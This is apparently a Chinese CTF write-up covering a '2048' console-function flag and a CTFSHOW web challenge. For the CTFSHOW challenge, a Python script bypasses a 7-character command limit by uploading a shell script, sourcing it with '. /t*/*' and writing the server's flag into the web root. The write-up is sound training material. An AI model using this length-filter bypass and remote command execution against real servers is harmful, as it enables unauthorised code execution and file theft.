### [2048](https://ce.pwnthebox.com/challenges?type=5&id=206)

打开靶机后查看源码发现`main2048.js`，查看详情发现有个`gamewin()`函数，在`Console`输入`gamewin()`后弹出提示框，提示框显示的`flag{2O48_1s_fun}`是假`flag`，真正的`flag`在`Console`的输出里，提交`HEBTUCTF{Aaenc0de_1s_FuN}`即可。

------

## CTFSHOW

### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)

靶机支持短命令执行但不会回显，审计代码发现关键函数`isSafe()`。

```javascript
function isSafe(cmd)
{
	return cmd.length<=7;
}
```

`ctfshow{26c5c506-d5b9-4fa8-8916-dff74381d313}`

```python
import requests

url = 'http://4a250af8-d2dd-4f75-ac03-9f2edbce2fb6.challenge.ctf.show/'

file = {"file": "#!/bin/sh\ncat /f* > /var/www/html/flag.txt"}
data = {"cmd": ". /t*/*"}
response = requests.post(url+"api/tools.php", files=file, data=data)
if "t*" in response.text:
    print("The command has been executed.")
response = requests.get(url=url+'flag.txt')
if response.status_code == 200:
    print('flag: '+response.text)
else:
    print('error')
```

------

